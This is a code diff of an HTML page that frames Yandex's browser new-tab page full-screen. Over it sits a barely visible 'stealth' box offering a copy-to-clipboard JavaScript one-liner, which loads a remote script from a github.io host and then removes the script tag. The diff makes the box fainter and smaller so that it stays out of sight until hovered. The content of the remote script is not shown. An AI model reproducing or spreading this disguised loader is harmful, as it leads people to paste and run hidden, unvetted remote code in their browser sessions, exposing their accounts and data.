@@ -14,7 +14,7 @@
       height: 100%;
       overflow: hidden;
       background: #f4f4f4;
-      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Arial, sans-serif;
+      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, monospace;
     }
     .yandex-frame {
       position: fixed;
@@ -27,56 +27,57 @@
     }
     .stealth-copy-box {
       position: fixed;
-      bottom: 16px;
-      left: 16px;
+      bottom: 10px;
+      left: 10px;
       z-index: 999999;
-      background: rgba(255, 255, 255, 0.95);
-      backdrop-filter: blur(8px);
-      border: 1px solid rgba(0, 0, 0, 0.15);
-      border-radius: 8px;
-      padding: 10px 12px;
-      max-width: 480px;
-      box-shadow: 0 4px 20px rgba(0, 0, 0, 0.15);
+      background: transparent;
+      padding: 2px;
+      max-width: 440px;
+      opacity: 0.25;
+      transition: opacity 0.2s ease;
       display: flex;
       flex-direction: column;
-      gap: 6px;
+      gap: 4px;
+    }
+    .stealth-copy-box:hover {
+      opacity: 0.95;
     }
     .code-preview {
       font-family: Consolas, "Courier New", monospace;
-      font-size: 11px;
-      line-height: 1.35;
-      background: #f8f9fa;
-      border: 1px solid #dee2e6;
+      font-size: 10px;
+      line-height: 1.25;
+      background: rgba(0, 0, 0, 0.45);
+      color: rgba(255, 255, 255, 0.85);
+      border: 1px solid rgba(255, 255, 255, 0.15);
       border-radius: 4px;
-      padding: 6px 8px;
-      color: #212529;
+      padding: 4px 6px;
       word-break: break-all;
       user-select: all;
       cursor: pointer;
+      backdrop-filter: blur(4px);
     }
     .copy-btn {
-      background: #fc3f1d;
-      color: #ffffff;
-      border: none;
-      border-radius: 6px;
-      padding: 6px 14px;
-      font-size: 12px;
-      font-weight: 600;
+      background: rgba(0, 0, 0, 0.35);
+      color: rgba(255, 255, 255, 0.75);
+      border: 1px solid rgba(255, 255, 255, 0.2);
+      border-radius: 4px;
+      padding: 3px 8px;
+      font-size: 10px;
+      font-family: inherit;
       cursor: pointer;
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      gap: 6px;
-      transition: background 0.15s ease, transform 0.1s ease;
+      transition: all 0.15s ease;
+      text-align: center;
+      backdrop-filter: blur(4px);
     }
     .copy-btn:hover {
-      background: #e03212;
-    }
-    .copy-btn:active {
-      transform: scale(0.98);
+      background: rgba(0, 0, 0, 0.65);
+      color: #ffffff;
+      border-color: rgba(255, 255, 255, 0.4);
     }
     .copy-btn.copied {
-      background: #00ba34;
+      background: rgba(16, 185, 129, 0.5);
+      color: #ffffff;
+      border-color: #10b981;
     }
   </style>
 </head>
@@ -84,10 +85,8 @@
   <iframe class="yandex-frame" src="https://yandex.ru/chrome/newtab" id="yandexFrame"></iframe>
 
   <div class="stealth-copy-box">
-    <div class="code-preview" id="codeText" title="Нажмите, чтобы выделить и скопировать">s=document.createElement('script');s.src='https://grzlly.github.io/sibs/1.js?t='+Date.now();s.onload=()=>s.remove();document.head.append(s)</div>
-    <button class="copy-btn" id="copyBtn">
-      <span>Скопировать в буфер</span>
-    </button>
+    <div class="code-preview" id="codeText" title="Кликните для копирования">s=document.createElement('script');s.src='https://grzlly.github.io/sibs/1.js?t='+Date.now();s.onload=()=>s.remove();document.head.append(s)</div>
+    <button class="copy-btn" id="copyBtn">Скопировать в буфер</button>
   </div>
 
   <script>
@@ -119,10 +118,10 @@
 
     function showSuccess() {
       copyBtn.classList.add('copied');
-      copyBtn.innerHTML = '<span>✓ Скопировано в буфер!</span>';
+      copyBtn.innerText = '✓ Скопировано';
       setTimeout(() => {
         copyBtn.classList.remove('copied');
-        copyBtn.innerHTML = '<span>Скопировать в буфер</span>';
+        copyBtn.innerText = 'Скопировать в буфер';
       }, 2000);
     }
 
